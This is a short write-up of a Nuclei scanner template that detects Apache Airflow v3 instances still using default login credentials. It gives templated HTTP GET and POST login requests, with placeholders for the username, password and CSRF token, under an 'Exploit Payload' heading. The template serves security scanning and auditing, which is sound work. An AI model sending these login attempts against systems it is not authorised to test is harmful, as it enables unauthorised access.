# Nuclei Template: Apache Airflow v3 Default Login
**Template ID:** airflow-v3-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`airflow-v3-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Apache Airflow v3 default login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
GET /auth/login/ HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

POST /auth/login/ HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/auth/login

username={{username}}&password={{password}}&_csrf_token={{csrf_token}}
```

## References
- https://airflow.apache.org/docs/apache-airflow/stable/start/docker.html
